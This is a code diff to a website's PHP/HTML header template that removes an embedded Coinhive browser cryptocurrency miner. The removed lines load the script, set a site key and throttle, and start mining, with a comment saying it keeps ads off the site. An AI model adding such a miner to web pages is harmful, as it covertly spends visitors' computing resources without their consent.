@@ -75,16 +75,6 @@ if (isset($GLOBALS['HeaderOpts']['sorttable'])) {
 
 ?>
 <script src="/inc/js/site.js?1" type="text/javascript"></script>
-<!-- Experimental. Trying for one day. 2012-09-22 -->
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-miner = new CoinHive.Anonymous('BV46oubaG1JdP1rj22bX79tA9tjHdgmE', {
-    // I do try to be nice about this. It keeps ads off my site.
-    // 99% of the time this shouldn't be mining.
-    throttle: 0.99
-});
-miner.start();
-</script>
 </head>
 <body>
 <table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
